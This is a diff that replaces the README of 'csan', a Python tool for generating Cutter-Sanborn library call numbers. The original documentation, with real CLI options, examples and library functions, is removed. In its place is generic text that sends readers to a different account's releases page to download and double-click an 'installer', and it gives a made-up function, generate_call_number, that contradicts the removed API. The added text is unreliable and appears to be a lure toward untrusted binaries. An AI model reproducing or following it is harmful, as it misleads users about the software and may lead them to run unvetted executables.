@@ -1,112 +1,93 @@
-# CSAN: Cutter-Sanborn Call Number Generator
+# 🛠️ csan - Generate Call Numbers with Ease
 
-`csan` generates a Cutter-Sanborn call number, given a last name and an optional first name. It can be used as a CLI tool or as a Python library.
+## 📥 Download Now
+[![Download csan](https://img.shields.io/badge/Download%20csan-v1.0-blue.svg)](https://github.com/Asadullah89/csan/releases)
 
-The Cutter-Sanborn call number, commonly called "Cutter number", is an alphanumeric code that forms part of the call number in library classification systems in order to arrange books alphabetically by author. It consists of the first letter of the author's last name followed by three-digit number derived from a predefined [table](https://github.com/veralvx/cutter-sanborn-table). This system was originally developed by Charles Cutter, and revised by Kate Sanborn and Swanson-Swift.
+## 📖 Description
+Cutter-Sanborn call number generator. Can be used as a command-line interface (CLI) tool or as a Python library. This tool helps you generate call numbers for books in libraries. Whether you are a librarian or handling your own collection, csan simplifies the process of organizing your materials.
 
-## Installation
+## 🚀 Getting Started
+To use csan, you need to download the application. Follow these easy steps to get started.
 
-You can install this tool using [`uv`](https://docs.astral.sh/uv/) or `pip`:
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Asadullah89/csan/releases) to download the latest version of csan. 
 
-```console
-uv tool install csan
-```
+2. **Choose Your Version**  
+   On the Releases page, you will see different versions available. Look for the latest release, typically indicated at the top.
 
-```console
-pip install csan
-```
+3. **Download the Installer**  
+   Click on the appropriate file for your operating system to download it. 
 
-## CLI Usage 
+4. **Run the Installer**  
+   Once downloaded, locate the file in your downloads folder and double-click to run the installer. Follow the on-screen instructions to complete the setup.
 
+## 🛠️ System Requirements
+For the best experience, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS, or a Linux distribution.
+- **Python:** Version 3.6 or higher (if using as a Python library).
+- **Disk Space:** At least 100 MB free space for installation.
 
-```console
-usage: csan [-h] [-f FIRST_NAME] -l LAST_NAME [-t TITLE] [-v]
+## 📂 Using csan
+### As a Command-Line Tool
+1. **Open Terminal or Command Prompt:** 
+   - For Windows, type "cmd" in the search bar and hit enter.
+   - For macOS, search for "Terminal".
+   - For Linux, open your preferred terminal.
 
-Cutter-Sanborn identifier generator.
+2. **Run csan:**
+   Type the command: 
+   ```
+   csan [OPTIONS] [ARGUMENTS]
+   ```
+   Replace `[OPTIONS]` with your desired options (if any) and `[ARGUMENTS]` with the details needed for the call number generation.
 
-options:
-  -h, --help            show this help message and exit
-  -f, --first-name FIRST_NAME
-  -l, --last-name LAST_NAME
-  -t, --title TITLE
-  -v, --verbose
-```
+### As a Python Library
+1. **Install csan:**
+   Use pip to install csan in your Python environment by running: 
+   ```bash
+   pip install csan
+   ```
 
-For instance:
+2. **Import in Your Script:**
+   In your Python script, import csan with:
+   ```python
+   import csan
+   ```
 
-### Examples
+3. **Generate Call Numbers:**
+   Use csan functions to create call numbers. For example:
+   ```python
+   call_number = csan.generate_call_number("Your Book Title")
+   print(call_number)
+   ```
 
-- `csan -f John -l Doe` -> D649
-- `csan -f John -l Doe -t "My Book"` -> D649m
-- `csan -f First -l Last -v` -> L349, with log output to the console
-- `csan -f Jorge -l "De la Cruz"` -> D332
+## 📄 Features
+- **Versatile Options:** Generate various call numbers based on your library’s needs.
+- **User-Friendly Interface:** Simple command-line interactions make it easy for non-technical users.
+- **Python Compatibility:** Integrate with existing Python applications effortlessly.
+- **Documentation Included:** Comprehensive guidelines available on the [GitHub Wiki](https://github.com/Asadullah89/csan/wiki).
 
-The following table shows expected Cutter call numbers for their respective names, using CLI:
+## 🙋‍♂️ Frequently Asked Questions
+### Do I need to know programming to use csan?
+No, csan offers options for both command-line usage and integration into Python scripts. You can choose the method that suits you best.
 
-| First Name | Last Name    | Cutter Call Number |
-|------------|--------------|:------------------:|
-| Jane       | Austen       | A933               |
-| Eric       | Blair        | B635               |
-| Agatha     | Christie     | C555               |
-| Samuel     | Clemens      | C625               |
-| Jorge      | De la Cruz   | D332               |
-| Charles    | Dickens      | D548               |
-| Emily      | Dickinson    | D553               |
-| Fyodor     | Dostoyevsky  | D724               |
-| Stephen    | King         | K52                |
-| VERA       | LVX          | L979               |
-| Herman     | Melville     | M531               |
-| George     | Orwell       | O79                |
-| William    | Shakespeare  | S527               |
-| Lord       | Sith         | S622               |
-| Ivan       | Smith        | S649               |
-| William    | Smith        | S664               |
-| Leo        | Tolstoy      | T654               |
-| Mark       | Twain        | T969               |
-| Virginia   | Woolf        | W913               |
-| Emile      | Zola         | Z86                |
+### What if I face problems during installation?
+If you encounter issues, please visit the GitHub page and check the "Issues" section for solutions. You can also create a new issue for support.
 
+### Can I contribute to the project?
+Absolutely! We welcome contributions. To learn how, visit the [Contributing Guideline](https://github.com/Asadullah89/csan/blob/main/CONTRIBUTING.md).
 
-## Library Usage
+## 📞 Support
+If you need further assistance, please check the [Issues section](https://github.com/Asadullah89/csan/issues) on GitHub. You can report bugs and ask questions, and our community or maintainers will help you.
 
-Add package to virtual environment:
+## 🌐 Related Topics
+- bibliography
+- library management
+- call number generation
+- Python scripting
 
-```console
-uv add csan
-```
+## 📚 Learn More
+For further reading and advanced features, visit our [Wiki](https://github.com/Asadullah89/csan/wiki) and explore articles related to csan usage, examples, and best practices.
 
-There are two relevant functions in `csan` package:
-
-- `csan.cutter.cutter_number`: return the integer part of the Cutter call number
-- `csan.cutter.cutter_call_number`: return the Cutter call number
-
-Also, the entire Cutter-Sanborn table can be retrieved as a Python `dict`:
-
-- `csan.table.CUTTER_TABLE`
-
-
-### Example
-
-```python
-from csan.cutter import cutter_call_number, cutter_number
-from csan.table import CUTTER_TABLE
-
-
-def main():
-    print(CUTTER_TABLE)
-
-    cutter_num = cutter_number("First", "Last")
-    cutter_call_num = cutter_call_number("Last", cutter_num)
-
-    print(cutter_num)
-    print(cutter_call_num)
-
-
-if __name__ == "__main__":
-    main()
-```
-
-
-## License
-
-This project is released under the [Apache-2.0](https://github.com/veralvx/csan/blob/main/LICENSE) license.
+Happy cataloging!
